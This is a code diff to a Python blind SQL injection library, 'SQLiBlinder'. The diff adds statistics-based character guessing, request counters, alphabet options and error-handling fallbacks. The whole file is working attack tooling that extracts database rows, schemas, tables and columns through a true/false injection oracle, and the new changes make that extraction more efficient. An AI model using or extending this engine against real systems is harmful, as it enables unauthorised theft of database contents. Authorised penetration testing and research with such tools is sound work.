@@ -1,17 +1,28 @@
 from concurrent.futures import ThreadPoolExecutor
 from .engines import *
+from .statistics import *
 import logging
+from enum import Enum
+
+class ErrorProcessStrategy(Enum):
+    FULL_SEARCH = 1
+
 
 class SQLiBlinder:
 	"""Blind SQL injector"""
 
-	def __init__(self, request_func, dbms, multithreaded=True, threads=16, auto_string_convert=True, get_long_strings=False):
+	def __init__(self, request_func, dbms, multithreaded=True, threads=16, 
+				auto_string_convert=True, get_long_strings=False, 
+				error_processing_strategy=ErrorProcessStrategy.FULL_SEARCH,
+				char_in_position_opt=True):
 		"""`request_func` - function, that take 1 param. If param is "1=1" request_func must return True,if param is "1=0" request_func must return False
 		 `dbms` - one of ["mysql","mssql","oracle","sqlite"]
 		 `multithreaded` - if True run number of threads, else one
 		 `threads` - number of threads (only for multithreaded)
 		 `auto_string_convert` - convert all columns to string (via CAST(col as TEXT) etc.
-		 `get_long_strings` - do find symbols after 64"""
+		 `get_long_strings` - do find symbols after 64
+		 `char_in_position_opt` - do statistics analyze of chars in same position. For example, GUID always have same symbol dash in known position. If statistics shows that symbol always in same position, then check this char first.
+		 """
 		self.request_func = request_func
 		self.dbms = dbms.lower()
 		self.init_params(self.dbms)
@@ -20,6 +31,14 @@ class SQLiBlinder:
 		self.auto_string_convert = auto_string_convert
 		self.get_long_strings = get_long_strings
 		self.long_string_limit = 64
+		self.ascii_search_limit = 128 #128 - low part of ascii table for search, 256 - full ascii table		
+		self.error_processing_strategy = error_processing_strategy
+		self.total_chars = 0
+		self.total_requests = 0
+		self.not_char_requests = 0
+		self.statistics = Statistics()
+		self.char_in_position_opt = char_in_position_opt
+		self.char_in_position_opt_count = 3
 
 	def get_column_expression(self,column):
 		if self.auto_string_convert:
@@ -82,16 +101,19 @@ class SQLiBlinder:
 		return f"({query}) not in ({converted_subset})"
 
 	def get_bool(self, sql):
+		self.total_requests+=1
 		return self.request_func(sql)
 
 	# start_val should be power of 2
-	def binary_search(self, s, start_val, start_val_defined=False, search_for_number=False):
+	def binary_search(self, s, start_val, start_val_defined=False, search_for_number=False, not_char_request=False):
 		# define real_start_val:
 		if not start_val_defined:
 			while True:
 				sql = self.build_sql_binary_query(
 					s, start_val - 1, search_for_number)
 				# print sql
+				if(not_char_request):
+					self.not_char_requests+=1
 				r = self.get_bool(sql)
 				if r:
 					start_val *= 8
@@ -103,6 +125,8 @@ class SQLiBlinder:
 		while True:
 			sql = self.build_sql_binary_query(s, cur_val, search_for_number)
 			# print sql
+			if(not_char_request):
+				self.not_char_requests+=1
 			r = self.get_bool(sql)
 			# print r
 			if move < 1:
@@ -119,29 +143,33 @@ class SQLiBlinder:
 	def binary_search_set(self, s, alph_set):
 		if len(alph_set)==0:
 			return False
-		alph_set += ['CANNRY']
+		alph_set = [c for c in alph_set]
+		alph_set += ['CANNARY']
 		while True:
 			l = len(alph_set)
 			first_part = alph_set[:l//2]
 			sql = self.build_sql_binary_set_query(s,first_part)
-			logging.debug(sql)
+			#print(sql)
 			r = self.get_bool(sql)
-			logging.debug(r)
+			#print('Result: {}'.format(r))
 			if not r:
 				new_alph_set = first_part
 			else:
+
 				new_alph_set = alph_set[l//2:]
 			if len(new_alph_set) == 1:
 				if new_alph_set[0]=='CANNARY':
 					return False
 				else:
 					return new_alph_set[0]
+			#print(f'old subset: {alph_set}')
 			alph_set = new_alph_set
-			logging.debug(f'new subset: {new_alph_set}')
+
+			#print(f'new subset: {new_alph_set}')
 
 	def get_count(self, table_name, where=None):
 		s = self.define_count(table_name, where)
-		return self.binary_search(s, 32, False, True)
+		return self.binary_search(s, 32, False, True, not_char_request=True)
 
 	def get_integer(self, table_name, column_name, index, where=None, order_by=None):
 		s = self.define_string(table_name, column_name,
@@ -152,24 +180,48 @@ class SQLiBlinder:
 		s = self.define_string_len(
 			table_name, column_name, index, where, order_by)
 		if self.get_long_strings: 
-			result =  self.binary_search(s, 32, start_val_defined=False, search_for_number=True)
+			result =  self.binary_search(s, 32, start_val_defined=False, search_for_number=True, not_char_request=True)
 		else:
-			result = self.binary_search(s,self.long_string_limit,start_val_defined=True,search_for_number=True)
+			result = self.binary_search(s,self.long_string_limit,start_val_defined=True,search_for_number=True, not_char_request=True)
 		#print (self.get_long_strings, result)
 		return result
 
 	def get_char(self, table_name, column_name, index, str_pos, where=None, order_by=None, alphabet=None):
+		res_found = False
 		s = self.define_string_char(
 			table_name, column_name, index, str_pos, where, order_by)
-		if alphabet is None:
-			return chr(self.binary_search(s, 256, True))
-		else:
-			return self.binary_search_set(s,alphabet)
+		if self.char_in_position_opt:
+			stats = self.statistics.get_char_in_position(table_name,column_name,str_pos-1)
+			if len(stats)>=self.char_in_position_opt_count:
+				#print (f'pos: {str_pos}')
+				#print (f'Stats for symbol {stats}')
+				if all([stats[0] == s for s in stats]) and stats[0] is not None:
+					#all symbols in str_pos are the same. Maybe this symbol too? check
+					#print(f'Check optimized symbol: {stats[0]}')
+					res = self.binary_search_set(s,[stats[0]])
+					#print(f'Found after binary search {res}')
+					#fefefe()
+					if res!=False:
+						#print(f'Found optimized symbol: {res}')
+						res_found=True
+		if res_found==False:
+			if alphabet is None:
+				res = chr(self.binary_search(s, self.ascii_search_limit, True))
+			else:
+				res = self.binary_search_set(s,alphabet)
+				if res == False:
+					# Char not in alph. Process Error
+					if self.error_processing_strategy == ErrorProcessStrategy.FULL_SEARCH:
+						res = chr(self.binary_search(s, self.ascii_search_limit, True))
+		self.total_chars+=1
+		return res
 
 	def get_char_for_pool(self, chunk):
 		return self.get_char(*chunk)
 
 	def get_string(self, table_name, column_name, index, where=None, order_by=None, alphabet=None):
+		if type(alphabet) == str:
+			alphabet = [c for c in alphabet]
 		l = self.get_length_of_string(
 			table_name, column_name, index, where, order_by)
 		logging.debug(f"length({column_name},{index}): {l}")
@@ -187,7 +239,7 @@ class SQLiBlinder:
 							(table_name, column_name, index, i + 1, where, order_by, alphabet) for i in range(l)])))
 				return r + suffix
 
-	def get(self, columns, table_name, where=None, order_by=None):
+	def get(self, columns, table_name, where=None, order_by=None,alphabet=None):
 		count = self.get_count(table_name, where)
 		logging.info(f"count of rows to extract: {count}")
 		res = []
@@ -199,8 +251,10 @@ class SQLiBlinder:
 		for i in range(count):
 			cs = []
 			for column in columns:
-				cs.append(self.get_string(table_name, column, i + self.dbms.offset_shift, where, order_by))
-			logging.debug(cs)
+				value = self.get_string(table_name, column, i + self.dbms.offset_shift, where, order_by,alphabet=alphabet)
+				self.statistics.log(table_name,column,value)
+				cs.append(value)
+			logging.warning(cs)
 			res.append(cs)
 		return res
 
@@ -220,16 +274,16 @@ class SQLiBlinder:
 		else:
 			return f"{self.dbms} not supported"
 
-	def get_schemata(self):
+	def get_schemata(self, alphabet=None):
 		if hasattr(self.dbms, "schemata_query"):
 			if hasattr(self.dbms, "schemata_disclaimer"):
 				logging.info(self.dbms.schemata_disclaimer)
 			column, table, where = self.dbms.schemata_query
-			return self.get([column], table, where=where)
+			return self.get([column], table, where=where,alphabet=alphabet)
 		else:
 			logging.info(f"{self.dbms} schemata request is not supported")
 
-	def get_tables(self, schema):
+	def get_tables(self, schema, alphabet=None):
 		if schema is None:
 			if hasattr(self.dbms, "tables_query"):
 				column, table, where = self.dbms.tables_query
@@ -241,15 +295,34 @@ class SQLiBlinder:
 			if hasattr(self.dbms, "tables_schema_query"):
 				column, table, where = self.dbms.tables_schema_query
 				where = where.format(schema_name=schema)
-				return self.get([column], table, where=where)
+				return self.get([column], table, where=where,alphabet=alphabet)
 			else:
 				logging.info(f"{self.dbms} tables request is not supported")
 
-	def get_columns(self, table_name):
+	def get_columns(self, table_name, alphabet=None):
 		if hasattr(self.dbms, "columns_query"):
 			column, table, where = self.dbms.columns_query
 			columns = self.get(
-				[column], table, where=where.format(table_name=table_name))
+				[column], table, where=where.format(table_name=table_name),alphabet=alphabet)
 			return [x[0] for x in columns]
 		else:
 			logging.info(f"{self.dbms} columns request is not supported")
+
+	def get_stats(self):
+		return [self.total_chars,self.total_requests,float(self.total_requests)/self.total_chars]
+
+	def print_stats(self):
+		print(f'Chars found: {self.total_chars}')
+
+		print(f'Total requests issued: {self.total_requests}')
+		char_requests = self.total_requests - self.not_char_requests
+		print(f'Only char requests issued: {char_requests}')
+		r_p_c = float(self.total_requests)/self.total_chars
+		print(f'Total requests per char: {r_p_c}')
+		c_r_p_c = float(char_requests)/self.total_chars
+		print(f'Char requests per char: {c_r_p_c}')
+
+	def get_statistics(self):
+		return self.statistics
+
+
